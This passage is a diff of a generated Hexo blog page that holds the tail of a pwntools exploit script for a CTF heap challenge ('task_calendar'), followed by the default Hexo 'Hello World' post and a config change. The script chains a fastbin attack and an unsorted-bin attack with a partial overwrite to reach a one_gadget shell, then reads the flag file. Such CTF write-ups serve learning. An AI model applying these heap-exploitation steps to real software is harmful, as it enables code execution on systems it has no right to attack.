p.recvuntil(&apos;choice&gt; &apos;)</span><br><span class="line">	p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">def exp(p):</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	p.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line"></span><br><span class="line">	p.sendline(&apos;123&apos;)</span><br><span class="line">	#print hex(libc.symbols[&apos;__malloc_hook&apos;])</span><br><span class="line">	libcbase=0x7ffff7a0d000</span><br><span class="line">	#########fastbin attack###########</span><br><span class="line">	add(p,1,0x10)</span><br><span class="line">	add(p,1,0x60)</span><br><span class="line">	add(p,1,0x68)</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	add(p,2,0x68)</span><br><span class="line">	add(p,3,0x60)</span><br><span class="line">	add(p,4,0x60)</span><br><span class="line">	edit(p,3,0x60,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	edit(p,1,0x68,&apos;a&apos;*0x68+chr(0x91))</span><br><span class="line"></span><br><span class="line">	dele(p,2)</span><br><span class="line">	#</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	edit(p,1,0x68,&apos;a&apos;*0x68+chr(0x71))</span><br><span class="line">	dele(p,4)</span><br><span class="line">	dele(p,3)</span><br><span class="line">	edit(p,3,1,&apos;\n&apos;)</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	edit(p,2,1,chr(0xfd)+chr(0x1a))</span><br><span class="line">	</span><br><span class="line">	add(p,1,0x60)</span><br><span class="line">	#</span><br><span class="line">	add(p,4,0x60)</span><br><span class="line">	</span><br><span class="line">	add(p,3,0x60)</span><br><span class="line">	dele(p,4)</span><br><span class="line">	edit(p,4,7,p64(0))</span><br><span class="line">	</span><br><span class="line">	#####unsorted bin attack##########</span><br><span class="line">	add(p,1,0x60)</span><br><span class="line">		</span><br><span class="line">	edit(p,1,9,p64(0)+chr(0x00)+chr(0x1b))</span><br><span class="line">	</span><br><span class="line">	add(p,1,0x60)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	#one=0xf66f0</span><br><span class="line">	#one = 0xcd0f3</span><br><span class="line">	#one = 0x4526a</span><br><span class="line">	one = 0xf02a4</span><br><span class="line">	one_gadget =libcbase+one</span><br><span class="line">	edit(p,3,5,&apos;aaa&apos;+p64(one_gadget)[0:3])</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	add(p,3,0x60)</span><br><span class="line">	</span><br><span class="line">	#dele(4)</span><br><span class="line">	#dele(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	p.sendline(&apos;cat haixiao.txt&apos;)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	#p.sendline(&apos;cat flag&apos;)</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	</span><br><span class="line">	while True:</span><br><span class="line">		try:	</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			p = process(&apos;./task_calendar&apos;, env = &#123;&apos;LD_PRELOAD&apos; : &apos;./libc6_2.23-0ubuntu10_amd64.so&apos;&#125;)</span><br><span class="line">				</span><br><span class="line">			</span><br><span class="line">			#p = remote(&apos;117.78.40.144&apos;, 31274)</span><br><span class="line">			exp(p)</span><br><span class="line">			break</span><br><span class="line">		except Exception as e:</span><br><span class="line">			# raise e</span><br><span class="line">			p.close()</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/18/calendar/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/12/hello-world/">Hello World</a>
-    </h1>
   
 
-        
-        <a href="/2018/10/12/hello-world/" class="archive-article-date">
-  	<time datetime="2018-10-12T11:54:45.877Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/12/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
+
   
 
 
@@ -630,8 +381,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
